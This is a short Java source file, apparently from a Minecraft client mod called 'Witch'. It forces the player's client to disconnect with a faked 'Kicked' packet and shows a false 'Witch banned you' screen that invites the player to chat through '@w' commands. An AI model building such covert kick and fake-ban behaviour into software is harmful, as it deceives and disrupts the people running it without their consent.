package me.soda.witch.features;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.DisconnectedScreen;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;
import net.minecraft.screen.ScreenTexts;
import net.minecraft.text.Text;

import static me.soda.witch.Witch.mc;

public class ServerUtil {
    public static void showDisconnectScreen(MinecraftClient client, Screen parent) {
        client.execute(() -> client.setScreen(new DisconnectedScreen(parent, ScreenTexts.CONNECT_FAILED,
                Text.literal("Witch banned you. Enter a singleplayer world and type \"@w <text>\" to chat with me."))));
    }

    public static void disconnect() {
        if (mc.player != null)
            mc.player.networkHandler.onDisconnect(new DisconnectS2CPacket(Text.literal("Kicked")));
    }
}
